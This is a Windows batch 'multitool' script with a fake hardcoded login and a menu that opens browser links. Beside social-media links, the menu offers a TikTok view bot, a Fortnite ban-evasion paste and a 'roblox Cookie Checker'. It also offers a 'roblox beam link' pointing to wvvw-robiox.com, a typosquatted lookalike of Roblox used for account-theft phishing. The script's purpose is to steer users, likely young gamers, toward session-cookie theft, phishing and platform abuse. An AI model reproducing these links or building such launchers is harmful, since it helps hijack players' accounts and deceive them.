@echo off
chcp 65001 >nul
:login
cls
color 5
title YT MultiTool Tutorial
echo.
echo █╗   ██╗███████╗ █████╗ ██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     
echo ██╗ ██╔╝██╔════╝██╔══██╗██║  ██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
echo ████╔╝ █████╗  ███████║███████║       ██║   ██║   ██║██║   ██║██║     
echo  ╚██╔╝  ██╔══╝  ██╔══██║██╔══██║       ██║   ██║   ██║██║   ██║██║     
echo   ██║   ███████╗██║  ██║██║  ██║       ██║   ╚██████╔╝╚██████╔╝███████╗
echo   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════
echo.
                                                                        

set /p user=username:
set /p pass=password:
if %user% == user if %pass% == pass goto main
echo Wrong login, try again...
timeout 3 >nul
goto login
:main
cls
echo.
echo ██╗   ██╗ ██████╗ ██╗   ██╗████████╗██╗   ██╗██████╗ ███████╗
echo ╚██╗ ██╔╝██╔═══██╗██║   ██║╚══██╔══╝██║   ██║██╔══██╗██╔════╝
echo  ╚████╔╝ ██║   ██║██║   ██║   ██║   ██║   ██║██████╔╝█████╗  
echo   ╚██╔╝  ██║   ██║██║   ██║   ██║   ██║   ██║██╔══██╗██╔══╝  
echo    ██║   ╚██████╔╝╚██████╔╝   ██║   ╚██████╔╝██████╔╝███████╗
echo    ╚═╝    ╚═════╝  ╚═════╝    ╚═╝    ╚═════╝ ╚═════╝ ╚══════╝
echo.
echo.
echo [1] - my discord server
echo [2] - Youtube
echo [3] - github
echo [4] - 4 letters and 4 letters
echo [5] - tiktok view bot
echo [6] - unban able fortnite user
echo [7] - roblox Cookie Checker
echo [8] - roblox beam link 
set /p main=Option: 
if %main% == 1 goto o1
echo.
if %main% == 2 goto o2
echo.
if %main% == 3 goto o3
if %main% == 4 goto o4
if %main% == 5 goto o5
if %main% == 6 goto 56
if %main% == 7 goto lol
if %main% == 8 goto lmao
:o1
start https://discord.gg/4mQdn7uQ7v
goto main
:o2
start https://www.youtube.com/channel/UCI-X5ind8vbXIoJEhjwKrnQ
goto main
:o3
start https://github.com/mp-8
goto main
:o4
start https://pastebin.com/raw/sjP7u4AB
goto main 
:o5
start https://fireliker.com/
goto main
:56
start https://pastebin.com/raw/qiBUvZzn
goto main
:lol
start https://story-of-jesus.xyz
goto main
:lmao
start https://wvvw-robiox.com/creates/GEN-5HALFYOA/
goto main 